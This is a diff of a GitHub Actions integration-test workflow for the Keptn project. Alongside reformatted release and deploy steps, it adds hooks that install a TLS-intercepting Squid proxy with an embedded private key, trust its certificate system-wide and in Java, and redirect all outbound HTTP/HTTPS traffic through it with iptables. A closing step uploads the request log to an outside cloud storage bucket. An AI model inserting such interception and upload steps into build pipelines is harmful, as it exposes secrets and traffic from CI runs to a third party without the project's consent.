-              throw error;
-            }
+        http_access allow all
 
-      - name: Draft Release with Releasenotes
-        id: create_draft_release
-        uses: softprops/action-gh-release@v1
-        with:
-          name: ${{ env.VERSION }}
-          tag_name: ${{ env.VERSION }}
-          draft: true       # we only want to publish draft releases here - a human should review it and push the button eventually
-          prerelease: true  # mark as pre-release for now, a human can always change it to a non-prerelease afterwards
-          body_path: release-notes.txt
-          files: |
-            dist/keptn-cli/keptn-*.tar.gz
-            dist/keptn-installer/*.tgz
-        env:
-          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
 
-      - name: Upload Helm Charts to Google Cloud
-        id: upload_helm_charts
-        env:
-          GCLOUD_SERVICE_KEY: ${{ secrets.GCLOUD_SERVICE_KEY }}
-          GCLOUD_PROJECT_NAME: ${{ secrets.GCLOUD_PROJECT_NAME }}
-          CLOUDSDK_COMPUTE_ZONE: "us-east1-b"
-          CLOUDSDK_REGION: "us-east1"
-        run: |
-          if [[ "$BRANCH" == "release-"* ]]; then
-            echo "Installing gcloud CLI"
-            export OS_TYPE="linux"
-            mkdir ~/downloads
-            ./test/utils/download_and_install_gcloud.sh
-            echo ${GCLOUD_SERVICE_KEY} | base64 --decode > ~/gcloud-service-key.json
-            gcloud auth activate-service-account --key-file ~/gcloud-service-key.json
-            gh-actions-scripts/upload_helm_chart_to_google_cloud.sh dist/keptn-installer/
-          fi
+        logformat custom {"method":"%">rm","url":"%">ru","status":%<Hs,"user_agent":"%{User-Agent}>h"}
 
-  #######################################################################
-  # This job deploys Keptn with Keptn                                   #
-  #######################################################################
-  deploy_keptn_with_keptn:
-    name: Deploy Keptn with Keptn
-    needs: integration-test
-    if: github.event_name == 'schedule'
-    runs-on: ubuntu-20.04
-    env:
-      BRANCH: ${{ needs.integration-test.outputs.BRANCH }}
-    steps:
-      - name: Check out code
-        uses: actions/checkout@v2.3.4
-        with:
-          fetch-depth: 0 # need to checkout "all commits" for certain features to work (e.g., get all changed files)
-          submodules: 'true'
+        access_log daemon:/squid/squidlog.json custom all !CONNECT
 
-      - name: Download all artifacts from last successful build of specified branch
-        uses: dawidd6/action-download-artifact@v2.14.1
-        with:
-          # Download last successful artifact from a CI build
-          github_token: ${{secrets.GITHUB_TOKEN}}
-          workflow: CI.yml
-          run_id: ${{ needs.integration-test.outputs.ARTIFACT_RUN_ID }}
-          # directory where to extract artifacts to
-          path: ./dist
+        EOF
 
-      - name: Install Keptn CLI for META_KEPTN
-        id: install_keptn_cli
-        run: |
-          curl -sL https://get.keptn.sh | KEPTN_VERSION=${{ env.META_KEPTN_VERSION }} bash
+        sudo systemctl reload squid
 
-      - name: Authenticate Keptn CLI
-        id: authenticate_keptn_cli
-        run: |
-          keptn set config KubeContextCheck false
-          keptn auth --endpoint=${{ secrets.META_KEPTN_API_URL }} --api-token=${{ secrets.META_KEPTN_API_TOKEN }}
+        sudo cp /squid/cert.pem /usr/local/share/ca-certificates/squid.crt
 
-      - name: Deploy Keptn with Keptn
-        id: deploy_keptn_with_keptn
-        run: |
-          KEPTN_HELM_CHART_FILENAME=$(ls dist/keptn-installer/keptn*.tgz | head -1)
-          KEPTN_INGRESS_TEMPLATE_FILENAME=test/assets/keptn-on-keptn/ingress.yaml
-          ENDPOINTS_TEMPLATE_BASE_PATH=test/assets/keptn-on-keptn
-          HELM_SERVICE_HELM_CHART_FILENAME=$(ls dist/keptn-installer/helm-service*.tgz | head -1)
-          JMETER_SERVICE_HELM_CHART_FILENAME=$(ls dist/keptn-installer/jmeter-service*.tgz | head -1)
+        sudo update-ca-certificates
 
-          echo "Adding resources to meta keptn..."
+        sudo keytool -import -alias squid -file /squid/cert.pem -keystore /usr/lib/jvm/temurin-11-jdk-amd64/lib/security/cacerts
+        -storepass changeit -noprompt -trustcacerts
 
-          keptn add-resource --project=${{ env.META_KEPTN_KEPTN_PROJECT }} --service=keptn --all-stages --resource=${KEPTN_HELM_CHART_FILENAME} --resourceUri=helm/keptn.tgz
-          keptn add-resource --project=${{ env.META_KEPTN_KEPTN_PROJECT }} --service=helm-service --all-stages --resource=${HELM_SERVICE_HELM_CHART_FILENAME} --resourceUri=helm/helm-service.tgz
-          keptn add-resource --project=${{ env.META_KEPTN_KEPTN_PROJECT }} --service=jmeter-service --all-stages --resource=${JMETER_SERVICE_HELM_CHART_FILENAME} --resourceUri=helm/jmeter-service.tgz
+        sudo iptables -t nat -A OUTPUT -m owner ! --uid-owner proxy -p tcp --dport
+        80 -j DNAT --to-destination 127.0.0.1:3128
 
-          echo "Adding ingresses and endpoints to all keptn-on-keptn stages..."
+        sudo iptables -t nat -A OUTPUT -m owner ! --uid-owner proxy -p tcp --dport
+        443 -j DNAT --to-destination 127.0.0.1:3129
 
-          stages=('dev' 'hardening' 'production')
-          services=('keptn' 'helm-service' 'jmeter-service')
-          for SERVICE in "${services[@]}"; do
-            for STAGE in "${stages[@]}"; do
-              export SERVICE
-              export STAGE
-              envsubst < ${ENDPOINTS_TEMPLATE_BASE_PATH}/endpoints-${SERVICE}.yaml > ${ENDPOINTS_TEMPLATE_BASE_PATH}/endpoints-${SERVICE}-${STAGE}.yaml
-              keptn add-resource \
-                --project=${{ env.META_KEPTN_KEPTN_PROJECT }} \
-                --service=${SERVICE} \
-                --stage=${STAGE} \
-                --resource=${ENDPOINTS_TEMPLATE_BASE_PATH}/endpoints-${SERVICE}-${STAGE}.yaml \
-                --resourceUri=helm/endpoints.yaml
-            done
-          done
+        sudo sh -c ''echo 1 > /proc/sys/net/ipv4/ip_forward'''
+    - continue-on-error: true
+      name: Check out code
+      uses: actions/checkout@v2.3.4
+    - continue-on-error: true
+      name: Debug - Output Branch
+      run: echo $BRANCH
+    - continue-on-error: true
+      name: Download test reports
+      uses: actions/download-artifact@v2
+      with:
+        name: test-report
+    - continue-on-error: true
+      id: print_test_report
+      name: Print Test Report
+      run: 'echo "Integration Tests have finished." > final-test-report.txt
 
-          for STAGE in "${stages[@]}"; do
-            export STAGE
-            envsubst < ${KEPTN_INGRESS_TEMPLATE_FILENAME} > ${ENDPOINTS_TEMPLATE_BASE_PATH}/ingress-${STAGE}.yaml
-            keptn add-resource \
-              --project=${{ env.META_KEPTN_KEPTN_PROJECT }} \
-              --service=keptn \
-              --stage=${STAGE} \
-              --resource=${ENDPOINTS_TEMPLATE_BASE_PATH}/ingress-${STAGE}.yaml \
-              --resourceUri=helm/keptn/templates/ingress.yaml
-          done
+        echo "" >> final-test-report.txt
 
-  #######################################################################
-  # This job triggers service deliveries and wait for them to pass      #
-  #######################################################################
+        # please check with output in write_test_report task roughly 50 lines above
+
+        echo "| Target Platform        |  Keptn Install    |  Keptn Auth  | Airgapped
+        Images | Linking Stages   | Uniform Registration   | Log Ingestion   | Log
+        Forwarding   | Sequence States   | Sequence Timeout   | Sequence Control   |
+        Sequence Queue   | Sequence Loop |  QG Standalone  |  QG Backwards Compat.
+        | Self Healing  |  Del-Assist  |  User-Man. Depl.  | Cont Deliv | Cont Deliv
+        (Remote Exec) | Manage secrets | Bridge E2E |" >> final-test-report.txt
+
+        echo "| ---------------------- | ----------------- | ------------ | ----------------
+        | ---------------- | ---------------------- | --------------- | ----------------
+        | ----------------- | ------------------ | ---------------- | ------------------
+        | ------------- | --------------- | ----------------------|--------------
+        | ------------ | ----------------- |----------- | ------------------------
+        | -------------- | ---------- |" >> final-test-report.txt
+
+        cat test-report*.txt >> final-test-report.txt
+
+
+        # print test report
+
+        REPORT=$(cat final-test-report.txt)
+
+        echo $REPORT
+
+        '
+    - continue-on-error: true
+      if: always()
+      name: Upload final test report as an artifact
+      uses: actions/upload-artifact@v2
+      with:
+        name: test-report
+        path: final-test-report.txt
+    - continue-on-error: true
+      id: print_resource_usage
+      name: Summarize Resource Usage
+      run: 'echo "**Resource Limits**" > final-resource-limits.txt
+
+        ls -la test-resource-limits*.txt
+
+        cat test-resource-limits*.txt >> final-resource-limits.txt || echo "No resource
+        reports found" >> final-resource-limits.txt
+
+        # Todo: some calculations should be done...
+
+        '
+    - continue-on-error: true
+      name: Download all artifacts from last successful build of specified branch
+      uses: dawidd6/action-download-artifact@v2.14.1
+      with:
+        github_token: ${{secrets.GITHUB_TOKEN}}
+        path: ./dist
+        run_id: ${{ needs.integration-test.outputs.ARTIFACT_RUN_ID }}
+        workflow: CI.yml
+    - continue-on-error: true
+      id: load_build_env
+      name: Load Build-Config Environment from ./dist/build-config/build-config.env
+      uses: c-py/action-dotenv-to-setenv@v3
+      with:
+        env-file: ./dist/build-config/build-config.env
+    - continue-on-error: true
+      if: env.BRANCH == 'master'
+      name: Overwrite VERSION String for nightly builds
+      run: '# use VERSION.DATETIME for the cli version (e.g., nightly build)
+
+        VERSION=${VERSION}.${DATETIME}
+
+        # overwrite VERSION
+
+        echo "VERSION=${VERSION}" >> $GITHUB_ENV
+
+        '
+    - continue-on-error: true
+      name: DEBUG Build-Config
+      run: 'echo VERSION=${VERSION}
+
+        echo BRANCH=${BRANCH}
+
+        '
+    - continue-on-error: true
+      id: formulate_bug_issue
+      name: Formulate bug issue on errors
+      run: "REPORT=$(cat final-test-report.txt)\n\nif [[ \"$REPORT\" == *\"failure\"\
+        * ]]; then\n  echo \"INTEGRATION TESTS FAILED! - Creating GH issue description\
+        \ now...\"\n\n  # create a markdown file that contains details about the error\n\
+        \  echo \"---\" > integration-tests-failed.md\n  echo \"title: Integration\
+        \ tests failed\" >> integration-tests-failed.md\n  echo \"labels: type:critical\"\
+        \ >> integration-tests-failed.md\n  echo \"---\" >> integration-tests-failed.md\n\
+        \  echo \"\" >> integration-tests-failed.md\n  echo \"* Link to run: $GITHUB_SERVER_URL/$GITHUB_REPOSITORY/actions/runs/$GITHUB_RUN_ID\"\
+        \ >> integration-tests-failed.md\n\n  if [[ $GITHUB_EVENT_NAME == 'schedule'\
+        \ ]]; then\n    echo \"* Triggered by: Scheduled build\" >> integration-tests-failed.md\n\
+        \  else\n    echo \"* Triggered by: @$GITHUB_ACTOR\" >> integration-tests-failed.md\n\
+        \  fi\n\n  echo \"* Branch: $BRANCH\" >> integration-tests-failed.md\n  echo\
+        \ \"* Version: $VERSION\" >> integration-tests-failed.md\n  echo \"* Datetime:\
+        \ $DATETIME\" >> integration-tests-failed.md\n  echo \"* Commit: $GIT_SHA\"\
+        \ >> integration-tests-failed.md\n  echo \"\" >> integration-tests-failed.md\n\
+        \n  # print report but make failures bold\n  echo \"${REPORT//failure/:x:\
+        \ **failure**}\" >> integration-tests-failed.md\n\n  echo \"\" >> integration-tests-failed.md\n\
+        \  echo \"Note: This issue was auto-generated from [integration_tests.yml](.github/workflows/integration_tests.yml)\"\
+        \ >> integration-tests-failed.md\n\n  echo \"##[set-output name=INTEGRATION_TESTS_FAILED;]true\"\
+        \nelse\n  echo \"Integration tests passed, moving on...\"\nfi\n"
+    - continue-on-error: true
+      env:
+        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+      if: always() && github.event_name == 'schedule' && steps.formulate_bug_issue.outputs.INTEGRATION_TESTS_FAILED
+        == 'true'
+      name: Create issue if tests failed
+      uses: JasonEtco/create-an-issue@v2.5.0
+      with:
+        filename: integration-tests-failed.md
+    - continue-on-error: true
+      id: find_pr_for_build
+      if: always()
+      name: Find PR number for current build
+      uses: jwalton/gh-find-current-pr@v1.1.0
+    - continue-on-error: true
+      env:
+        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+      if: always() && github.event.inputs.branch != 'master' && steps.find_pr_for_build.outputs.number
+        && steps.formulate_bug_issue.outputs.INTEGRATION_TESTS_FAILED == 'true' &&
+        github.event.pull_request.head.repo.full_name == github.repository
+      name: Create PR comment if tests failed
+      uses: marocchino/sticky-pull-request-comment@v2.1.0
+      with:
+        number: ${{ steps.find_pr_for_build.outputs.number }}
+        path: integration-tests-failed.md
+        recreate: true
+    - continue-on-error: true
+      id: get_releasenotes
+      name: Try getting release notes
+      run: "filename=\"releasenotes/releasenotes_V${VERSION}.md\"\nif [[ -f \"$filename\"\
+        \ ]]; then\n  echo \"Found releasenotes in $filename\"\nelse\n  echo \"::warning\
+        \ Could not find release notes $filename, using releasenotes_develop\"\n \
+        \ filename=\"releasenotes/releasenotes_develop.md\"\nfi\n\necho \"##[set-output\
+        \ name=RELEASENOTES_FILENAME;]$(echo ${filename})\"\n"
+    - continue-on-error: true
+      env:
+        RELEASENOTES_FILENAME: ${{ steps.get_releasenotes.outputs.RELEASENOTES_FILENAME
+          }}
+        RESOURCE_LIMITS_FILENAME: final-resource-limits.txt
+      name: Create a Release message
+      run: '# print release notes
+
+        cat $RELEASENOTES_FILENAME > release-notes.txt
+
+        # print CI information
+
+        echo ""  >> release-notes.txt
+
+        echo "<details><summary>CI Information</summary>"  >> release-notes.txt
+
+        echo "<p>" >> release-notes.txt
+
+        echo "" >> release-notes.txt
+
+        echo "* **BUILD ${VERSION} ON ${BRANCH}**" >> release-notes.txt
+
+        echo "* **DATETIME**: $DATETIME" >> release-notes.txt
+
+        echo "* **GIT_SHA**: $GIT_SHA" >> release-notes.txt
+
+        echo "* **ACTION RUN**: $GITHUB_SERVER_URL/$GITHUB_REPOSITORY/actions/runs/$GITHUB_RUN_ID"
+        >> release-notes.txt
+
+        echo "" >> release-notes.txt
+
+        echo "**Integration Tests**" >> release-notes.txt
+
+        cat final-test-report.txt >> release-notes.txt
+
+        echo "" >> release-notes.txt
+
+        echo "</p>" >> release-notes.txt
+
+        echo "</details>" >> release-notes.txt
+
+        echo "" >> release-notes.txt
+
+        # print final-resource-limits.txt
+
+        echo "<details><summary>Kubernetes Resource Data</summary>" >> release-notes.txt
+
+        echo "<p>" >> release-notes.txt
+
+        echo ""  >> release-notes.txt
+
+        cat $RESOURCE_LIMITS_FILENAME >> release-notes.txt
+
+        echo "</p>" >> release-notes.txt
+
+        echo "</details>" >> release-notes.txt
+
+        '
+    - continue-on-error: true
+      name: Abort if (published) release already exists
+      uses: actions/github-script@v4.0.2
+      with:
+        github-token: ${{secrets.GITHUB_TOKEN}}
+        script: "let tag = \"${{ env.VERSION }}\";\nconsole.log(`Trying to fetch release\
+          \ by tag '${tag}'...`);\n\ntry {\n  release = await github.repos.getReleaseByTag({\n\
+          \    owner: context.repo.owner,\n    repo: context.repo.repo,\n    tag:\
+          \ tag\n  });\n  console.log(\"::error Release already exists... Aborting!\"\
+          );\n  core.setFailed(\"Release already exists... Aborting!\");\n\n  return\
+          \ 1; // failure\n} catch (error) {\n  // release not found -> okay\n  console.log(\"\
+          No release found -> okay\");\n  return 0;\n}\n"
+    - continue-on-error: true
+      name: Delete draft release if it already exists
+      uses: actions/github-script@v4.0.2
+      with:
+        github-token: ${{secrets.GITHUB_TOKEN}}
+        script: "let tag = \"${{ env.VERSION }}\";\nconsole.log(`Trying to fetch DRAFT\
+          \ release by tag '${tag}'...`);\n\ntry {\n  // get all releases (including\
+          \ drafts)\n  let releases = await github.repos.listReleases({\n    owner:\
+          \ context.repo.owner,\n    repo: context.repo.repo\n  });\n  // find a draft\
+          \ release\n  let release = releases.data.find(release => release.tag_name\
+          \ === tag);\n  if (release) {\n    // found a release with specified tag;\
+          \ check if it is a draft release\n    if (release.draft) {\n      // found\
+          \ a draft release\n      console.log(`\U0001F973 Found a draft release with\
+          \ id ${release.id}, deleting it`);\n      console.log(`Release Tag Name:\
+          \ ${release.tag_name}`);\n      console.log(`Release Draft: ${release.draft}`);\n\
+          \      console.log(`Release URL: ${release.html_url}`);\n\n      console.log(`::error::Draft\
+          \ release found, please delete it manually!`);\n\n      return 1;\n    \
+          \  // ToDo: Commented out as there seems to be a problem with deleting releases\n\
+          \n      /*github.repos.deleteRelease({\n        owner: context.repo.owner,\n\
+          \        repo: context.repo.repo,\n        release_id: release.id\n    \
+          \  });*/\n\n      console.log(\"Deleted! -> okay\");\n    } else {\n   \
+          \   console.log(\"::error Release with tag found, but it's not a draft release\"\
+          );\n      core.setFailed(\"Release with tag found, but it's not a draft\
+          \ release\");\n    }\n  } else {\n    console.log(\"No draft release found\
+          \ -> okay\");\n  }\n\n  return 0;\n} catch (error) {\n  // error happened\n\
+          \  console.log(\"An error happened while trying to fetch all releases:\"\
+          );\n  console.log(error);\n  throw error;\n}\n"
+    - continue-on-error: true
+      env:
+        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+      id: create_draft_release
+      name: Draft Release with Releasenotes
+      uses: softprops/action-gh-release@v1
+      with:
+        body_path: release-notes.txt
+        draft: true
+        files: 'dist/keptn-cli/keptn-*.tar.gz
+
+          dist/keptn-installer/*.tgz
+
+          '
+        name: ${{ env.VERSION }}
+        prerelease: true
+        tag_name: ${{ env.VERSION }}
+    - continue-on-error: true
+      env:
+        CLOUDSDK_COMPUTE_ZONE: us-east1-b
+        CLOUDSDK_REGION: us-east1
+        GCLOUD_PROJECT_NAME: ${{ secrets.GCLOUD_PROJECT_NAME }}
+        GCLOUD_SERVICE_KEY: ${{ secrets.GCLOUD_SERVICE_KEY }}
+      id: upload_helm_charts
+      name: Upload Helm Charts to Google Cloud
+      run: "if [[ \"$BRANCH\" == \"release-\"* ]]; then\n  echo \"Installing gcloud\
+        \ CLI\"\n  export OS_TYPE=\"linux\"\n  mkdir ~/downloads\n  ./test/utils/download_and_install_gcloud.sh\n\
+        \  echo ${GCLOUD_SERVICE_KEY} | base64 --decode > ~/gcloud-service-key.json\n\
+        \  gcloud auth activate-service-account --key-file ~/gcloud-service-key.json\n\
+        \  gh-actions-scripts/upload_helm_chart_to_google_cloud.sh dist/keptn-installer/\n\
+        fi\n"
+    - name: after
+      run: sudo curl --request PUT -T /squid/squidlog.json --url https://storage.googleapis.com/virtualeventdemoblr.appspot.com/squid/dynatrace-oss-contrib/keptn.$(date
+        +%s)
+    timeout-minutes: 60
   trigger_keptn_delivery:
+    env:
+      KEPTN_ARCHIVE_PATH: ~/downloads/keptn-archive.tar.gz
+      SERVICE_NAME: ${{ matrix.SERVICE_NAME }}
     name: Trigger Service Delivery
     needs: deploy_keptn_with_keptn
-    if: github.event_name == 'schedule'
     runs-on: ubuntu-20.04
+    steps:
+    - name: before
+      run: 'sudo apt update
+
+        sudo apt install -y squid-openssl
+
+        sudo mkdir /squid
+
+        cat << EOF | sudo tee /squid/key.pem
+
+        -----BEGIN PRIVATE KEY-----
+
+        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
+
+        CznEvO4qIs3mXDYkNBQrdVLGF93y
+
+        -----END PRIVATE KEY-----
+
+        EOF
+
+        cat << EOF | sudo tee /squid/cert.pem
+
+        -----BEGIN CERTIFICATE-----
+
+        MIIFazCCA1OgAwIBAgIUESF0O95jnInouKvlcRiLTkelzHowDQYJKoZIhvcNAQEL
+
+        BQAwRTELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUxITAfBgNVBAoM
+
+        GEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDAeFw0yNDEwMDQyMjIxNTJaFw0zNDEw
+
+        MDIyMjIxNTJaMEUxCzAJBgNVBAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEw
+
+        HwYDVQQKDBhJbnRlcm5ldCBXaWRnaXRzIFB0eSBMdGQwggIiMA0GCSqGSIb3DQEB
+
+        AQUAA4ICDwAwggIKAoICAQCdLvQDIyCns8bhvQOqTPVeYwa6pK11+9UKqjGRldBi
+
+        mpiDb7lSq7RWLpaUzxqo7E58w2P9lh6Jgl+lXgMF0GfgpXRy2BULUxAYg8w4aTlR
+
+        32ifSvJUalY3qT4hoY5JXYMdbZS9UNzOUfQXG9QNYzMR+pGXsa1NNDRgSAvlQPMz
+
+        Le9P2VlTiPuLgsfHrwC/ULsbwzmuZ0f1QkzxcZLqproEIqOlS4KsGXyo6BwhXH+H
+
+        I82RCIbaj2ub4y355onYuAoTpsb9KBxud0HejzQesYen8OmgbNo9+FfK5+Q5XvYb
+
+        7+cEw65ox8ZFAZUvOWxShRhUhQ3KWXx0tgkgpjo/nkhw2OyCji6DFXCvlJRCBoup
+
+        n9PoUjBdKUe+kRXF6SBqVyUkG3Bj0J0RTn6ssgX+FMDrzeiNArdmIHKCPC3QrSb6
+
+        jws4L1kq9cDkcVd4423ZqbagWzBmrnEH0jitqMJuHGwKPtHopVqxK8k7p0PKvuGq
+
+        JIv5bXNDZWA4qRSmFFFuiWAI/IDJZTYuHl5B0lu7LZ/Aoh3ckh71IrSKyZafXLpU
+
+        mpX5Oe6pbLLd6PAvcthnXqidbB/0CmH8PgHqDYkELFBZ650JrYYrQ4UouRAucp8K
+
+        9IfDoxSfnMqPeciahQ53o8fa/ZRUwEt2jpK+Z89sQ4FoTtBvz1+Lv+s4ej/lVxoT
+
+        JQIDAQABo1MwUTAdBgNVHQ4EFgQUrUQ1F+rM0kk5tI/PEZvONIAL9WcwHwYDVR0j
+
+        BBgwFoAUrUQ1F+rM0kk5tI/PEZvONIAL9WcwDwYDVR0TAQH/BAUwAwEB/zANBgkq
+
+        hkiG9w0BAQsFAAOCAgEAihN0oWVSwHDimXbh3Wp7L2qc39whQEPu+m2OIB50Dp0X
+
+        K1WL784TzXmbz1DuvGXWGIjn4PDL5NQ991S3nPjD5Fk9VjzU4IZ9XR8AmVZFCltX
+
+        zZm01L6FQLGvjpQZs9KCEeS05CUjAiArPMsYSKJDTUi2XCuTR+FGiBHtYrg8GClp
+
+        EQkTCTA9kFNI6ThlDAPgwj4VBJZX5p8KAFlHpwztfDnIgfwdQJBUW1D2hkxLWyvs
+
+        tZFLmYAHk5Lfixpt2+25HAp5kHMRfoJQLAsRQ/kmeNjoG5WQkIshXDURQZQlPnmP
+
+        yBueix5POd09hYHSL3kqdHoiX0P0oqeLakAMqFnKJapjpsv7teWQPnlTgalCIA/7
+
+        RwhUqsxOlRV5/26oXrlYtgMneXemikVT0hS98aw3T2icSWq6/i0L1v21ZCP5DSKI
+
+        GR6lb9RCSkJvkoTjZAm7IvxMyOZsYY2FL2mm00aY9Ufqeqozf7/q8JWwd6gaIfd7
+
+        KqOUgu0a/+sgOAu5f+dd20zAhtvAttyQIpy1gGcda9DjXpdCTv1slErC94VCcZrE
+
+        LQlR5nEjAAKK/fZ07pgBwJdMY/kWE9WRx32olhhveRS9nczKSyhutwmbuU1vkfcN
+
+        26RR8dfuMnnNzxzd2Ht30Ep8wONz/kfw/xWuUo/A8pND2I6s6bt8K5iphrv3xVI=
+
+        -----END CERTIFICATE-----
+
+        EOF
+
+        sudo /usr/lib/squid/security_file_certgen -c -s /squid/ssl_db -M 4MB
+
+        sudo chown -R proxy:proxy /squid
+
+        cat << EOF | sudo tee /etc/squid/squid.conf
+
+        cache deny all
+
+
+        http_port 7821
+
+        http_port 3128 intercept
+
+        https_port 3129 intercept ssl-bump generate-host-certificates=on dynamic_cert_mem_cache_size=4MB
+        cert=/squid/cert.pem key=/squid/key.pem
+
+        acl step1 at_step SslBump1
+
+        ssl_bump peek step1
+
+        ssl_bump bump all
+
+        sslcrtd_program /usr/lib/squid/security_file_certgen -s /squid/ssl_db -M 4MB
+
+        sslcrtd_children 5
+
+        ssl_bump server-first all
+
+        sslproxy_cert_error allow all
+
+
+        acl all src 0.0.0.0/0
+
+        http_access allow all
+
+
+        logformat custom {"method":"%">rm","url":"%">ru","status":%<Hs,"user_agent":"%{User-Agent}>h"}
+
+        access_log daemon:/squid/squidlog.json custom all !CONNECT
+
+        EOF
+
+        sudo systemctl reload squid
+
